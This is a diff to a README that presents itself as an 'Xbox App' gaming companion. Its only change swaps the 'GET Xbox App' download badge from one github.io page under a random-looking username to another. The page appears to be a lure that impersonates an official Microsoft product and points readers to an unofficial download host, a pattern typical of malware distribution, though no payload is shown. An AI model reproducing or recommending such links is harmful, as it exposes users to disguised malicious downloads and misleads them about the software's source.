@@ -1,6 +1,6 @@
 # Xbox App - Gaming Companion for Console, PC, and Mobile
 
-[![GET Xbox App](https://img.shields.io/badge/GET%20%E2%80%94%20Xbox%20App-0078D6?style=for-the-badge&logoColor=white)](https://kingsleytuckerugpv.github.io/.github/xbox-app)
+[![GET Xbox App](https://img.shields.io/badge/GET%20%E2%80%94%20Xbox%20App-0078D6?style=for-the-badge&logoColor=white)](https://zaydenyatesemlt.github.io/.github/xbox-app)
 
 ## Xbox App Gaming Hub Overview
 
